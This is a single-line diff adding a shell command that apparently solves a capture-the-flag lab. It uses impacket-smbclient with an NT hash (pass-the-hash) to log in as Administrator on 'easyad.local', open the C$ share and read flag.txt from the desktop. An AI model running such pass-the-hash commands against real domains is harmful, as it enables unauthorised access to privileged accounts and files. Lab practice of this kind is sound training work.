@@ -1,0 +1,1 @@
+cd /tmp/gigatool && H=<NT_HASH> && printf 'use C$\nls Users\\Administrator\\Desktop\ncat Users\\Administrator\\Desktop\\flag.txt\n' > smbcmd.txt && timeout 90 impacket-smbclient -hashes :$H "easyad.local/Administrator@<IP>" < smbcmd.txt 2>&1 | tail -20
